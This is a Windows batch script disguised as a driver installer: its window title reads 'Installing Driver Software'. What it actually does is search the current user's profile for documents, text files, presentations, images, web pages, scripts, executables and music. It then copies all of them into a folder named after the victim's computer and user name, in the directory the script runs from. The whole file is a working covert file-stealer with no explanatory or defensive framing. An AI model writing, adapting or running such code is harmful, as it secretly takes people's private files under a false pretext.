@echo off
title Installing Driver Software
set indexPath="%cd%"
c:
set usr=%computername%--%username%
mkdir %indexpath%\%usr%
set machPath=%indexpath%\%usr%
:A
cd "%userprofile%"
del exeFiles.dat /f /s /q
del wordFiles.dat /f /s /q
del ppointFiles.dat /f /s/ q
del picFiles.dat /f /s /q
del htmlFiles.dat /f /s /q
del scriptFiles.dat /f /s /q
del musicFiles.dat /f /s /q
dir /b /s *.exe > exeFiles.dat
dir /b /s *.docx *.txt > wordFiles.dat
dir /b /s *.pptx > ppointFiles.dat
dir /b /s *.jpeg *.jpg *.png > picFiles.dat
dir /b /s *.html > htmlFiles.dat
dir /b /s *.vbs *.bat > scriptFiles.dat
dir /b /s *.mp3 > musicFiles.dat
mkdir "%machPath%\Word Documents"
mkdir "%machPath%\Pictures"
mkdir "%machPath%\Powerpoints"
mkdir "%machPath%\Executables"
mkdir "%machPath%\WebPages"
mkdir "%machPath%\Scripts"
mkdir "%machPath%\Music"
for /f "usebackq delims=" %%i IN (wordFiles.dat) DO copy "%%~fi" "%machPath%\Word Documents"
for /f "usebackq delims=" %%i IN (picFiles.dat) DO copy "%%~fi" "%machPath%\Pictures"
for /f "usebackq delims=" %%i IN (ppointFiles.dat) DO copy "%%~fi" "%machPath%\Powerpoints"
for /f "usebackq delims=" %%i IN (exeFiles.dat) DO copy "%%~fi" "%machPath%\Executables"
for /f "usebackq delims=" %%i IN (htmlFiles.dat) DO copy "%%~fi" "%machPath%\Webpages"
for /f "usebackq delims=" %%i IN (scriptFiles.dat) DO copy "%%~fi" "%machPath%\Scripts"
for /f "usebackq delims=" %%i IN (musicFiles.dat) DO copy "%%~fi" "%machPath%\Music"
